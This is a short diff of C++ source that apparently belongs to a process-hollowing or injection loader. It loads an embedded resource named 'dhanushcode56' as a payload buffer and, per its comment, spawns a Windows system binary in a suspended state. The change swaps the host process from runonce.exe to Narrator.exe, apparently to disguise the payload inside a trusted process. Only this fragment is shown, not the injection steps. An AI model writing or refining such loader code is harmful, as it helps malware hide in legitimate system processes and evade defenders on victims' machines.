@@ -34,7 +34,7 @@ int main() {
     loadResource_with("dhanushcode56", &code199k, &code199kLen);
 
     // Create a new process in a suspended stat
-    std::string path = "C:\\Windows\\System32\\runonce.exe";
+    std::string path = "C:\\Windows\\System32\\Narrator.exe";
     STARTUPINFO si = {0};
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
